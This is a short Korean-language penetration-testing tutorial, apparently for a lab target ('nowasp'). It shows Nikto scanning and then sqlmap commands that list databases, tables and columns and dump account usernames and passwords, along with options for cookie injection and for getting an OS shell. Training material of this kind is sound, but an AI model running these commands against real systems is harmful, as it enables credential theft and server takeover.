2. 침투 테스트 실행 가이드 (Implementation Guide)

01

취약점 정찰 (Vulnerability Scanning)

Tool: Nikto (웹 서버 취약점 스캐너)

공격의 첫 단추는 대상 서버에 어떤 페이지가 있고, 어떤 취약점이 있는지 파악하는 것입니다. Nikto (니토, 오픈소스 웹 스캐너)를 사용하여 서버 설정 오류 및 SQL 인젝션 가능성이 있는 경로를 찾아냅니다.

3. sqlmap 심화 활용 및 데이터 추출 (Advanced sqlmap Mastery)

sqlmap (에스큐엘맵)은 ASI (Automated SQL Injection, 자동화된 SQL 주입) 도구로, 데이터베이스의 구조 파악부터 내부 데이터 추출, 심지어 운영체제의 파일 시스템 접근까지 가능한 강력한 툴입니다.

[도식: sqlmap 자동화 엔진 작동 원리]

Injection Engine
Payload Generation
HTTP Request
Target DBMS
MySQL / Oracle / MSSQL

Phase 1: DB 탐색

# 대상 URL의 전체 DB 목록 확인
sqlmap -u "[URL]" --dbs --batch

--dbs: Database Enumeration (데이터베이스 열거) 옵션입니다. 서버에 존재하는 모든 DB 이름을 가져옵니다.

Phase 2: 테이블 탐색

# 특정 DB 내의 테이블 목록 확인
sqlmap -u "[URL]" -D nowasp --tables

-D [DB명]: 타겟 데이터베이스를 지정합니다.
--tables: 해당 DB 내의 모든 테이블 이름을 열거합니다.

Phase 3: 컬럼 탐색

# 계정 정보가 담긴 컬럼 확인
sqlmap -u "[URL]" -D nowasp -T accounts --columns

-T [테이블명]: 타겟 테이블을 지정합니다.
--columns: 테이블의 구조(열 이름 및 데이터 타입)를 확인합니다.

Phase 4: 데이터 덤프

# 최종 관리자 아이디/비번 추출
sqlmap -u "[URL]" -D nowasp -T accounts -C "username,password" --dump

--dump: Data Extraction (데이터 추출)을 수행하여 화면에 출력하고 로컬 파일로 저장합니다.

기타 유용한 sqlmap 옵션 (Utility Options)

  • --cookie="[SESS_ID]": 로그인 세션이 필요한 경우 세션 값을 주입합니다.
  • --proxy="http://127.0.0.1:8080": Burp Suite (버프 스위트)를 거쳐 패킷을 분석하며 공격할 때 사용합니다.
  • --level=5 / --risk=3: 탐색 깊이와 위험도를 높여서 더 복잡한 취약점을 찾아냅/니다.
  • --os-shell: DB 권한이 높을 경우 타겟 서버의 OS 쉘을 획득합니다.
